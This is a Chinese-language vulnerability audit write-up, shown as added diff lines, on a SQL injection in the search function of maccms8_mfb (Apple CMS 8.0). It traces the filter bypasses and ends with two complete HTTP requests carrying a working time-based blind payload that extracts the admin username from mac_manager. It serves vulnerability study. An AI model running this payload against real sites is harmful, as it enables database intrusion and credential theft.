@@ -1,0 +1,23 @@
+0x00 相关信息
+源码信息：maccms8_mfb(苹果CMS视频分享程序 8.0 | 2017.09.27 发布)
+源码下载：http://www.mycodes.net/47/7798.htm(官网http://www.maccms.com/down.html 已悄悄修复╮(╯▽╰)╭)
+问题位置：maccms8_mfb\inc\common\function.php中htmlEncode方法
+漏洞类型：前台SQL注入漏洞
+0x01 审计过程
+首先在maccms8_mfb\inc\module\vod.php文件中的第93-98行的代码当$method=search成立的时候便回进入到be("all", "wd")获取请求中wd参数的值，并使用chkSql($wd)方法对$wd进行安全处理。
+跟入be方法在maccms8_mfb\inc\common\function.php文件中的第266-294行中可看到该方法是对GET，POST，REQUEST接收到的参数进行addslashes的转义处理，根据上一步可以知道be("all", "wd")是，使用REQUEST接收wd参数的值并使用addslashes函数进行转义处理。
+回到maccms8_mfb\inc\module\vod.php第96行再跟入chkSql方法，在maccms8_mfb\inc\common\360_safe3.php文件中的第27-43行中可以看到该方法是将接收到的变量进行循环urldecode直到解出原文为止，解出后再丢进StopAttack进行处理，处理完成后返回htmlEncode($s)的值。
+跟入StopAttack方法在maccms8_mfb\inc\common\360_safe3.php文件中的第12-26行中可以看到该方法是使用接收到的正则$ArrFiltReq进行安全处理。
+跟入$getfilter在maccms8_mfb\inc\common\360_safe3.php文件中的第57-61行可以看到该方法是检测GET，POST，COOKIE中的关键字的拦截规则，且该检测规则存在被绕过的问题。
+回到maccms8_mfb\inc\common\360_safe3.php的第42行再跟入htmlEncode方法，在maccms8_mfb\inc\common\function.php文件中的572-586行可以看到该方法是对&，’，空格，”，TAB，回车，换行，大小于号进行实体化的转换，此处没有对其他的空白字符和反斜杠进行处理，可以被绕过。
+回到maccms8_mfb\inc\module\vod.php第98行再跟入$tpl->P["wd"] = $wd;，在maccms8_mfb\inc\common\template.php文件的第2372行看到$tpl被创建的位置，且class AppTpl也是在当前文件被创建的，跟踪P["wd"]数据发现传递给了$lp['wd'],然后跟踪$lp['wd'],在如下两处进行了SQL的拼接处理，所以存在SQL注入，且是单引号字符型注入。
+第一处：需要请求m参数为m=vod-search的时候触发。
+第二处：需要请求m参数为m=art-search的时候触发。
+0x02 漏洞复现
+在上述的分析过程中可以知道htmlEncode仅对&，’，空格，”，TAB，回车，换行，大小于号进行实体化的转换，可以使用%0b绕过，但是根据0x01中的第7步可以知道是字符型注入，需要闭合单引号，htmlEncode又把单引号进行的实体化，所以可以转换思路，如下两个SQL语句拼接时候$lp['wd']在SQL语句中可以控制两个位置，因此可以传入反斜杠进行单引号的转义和闭合，又由于0x01中第2步得知REQUEST请求使用了addslashes函数进行转义处理，0x01中的第3步中使用urldecode进行解码，所以可以使用双url编码绕过addslashes函数。
+类似如下的操作：
+最终的利用payload，mac_vod和mac_art两张表中要有数据。
+在进行数据的枚举时候需要将cookie 中的PHPSESSID删掉，否则会限制快速访问，如下是对应的EXP，获取的正确数据变会延迟5s回显。
+POST /code/maccms8_mfb/index.php?m=vod-search HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 91 Connection: keep-alive Upgrade-Insecure-Requests: 1 wd=))||if((select%0b(select(m_name)``from(mac_manager))regexp(0x5e61)),(`sleep`(5)),0)#%25%35%63 POST /code/maccms8_mfb/index.php?m=art-search HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 91 Connection: keep-alive Upgrade-Insecure-Requests: 1 wd=))||if((select%0b(select(m_name)``from(mac_manager))regexp(0x5e61)),(`sleep`(5)),0)#%25%35%63
+0x03 小小总结
+用反斜杠转义单引号的方法适用当用户可控的位置有两处及以上，且在同一SQL语句中被拼接，当然前提是反斜杠未被处理，本篇就是这种情况，本篇漏洞复现的源码官方已经悄然修复，所以大家要进行漏洞学习的话请前往http://www.mycodes.net/47/7798.htm进行源码的下载，当然如果大家有更好的思路欢迎一起讨论交流。
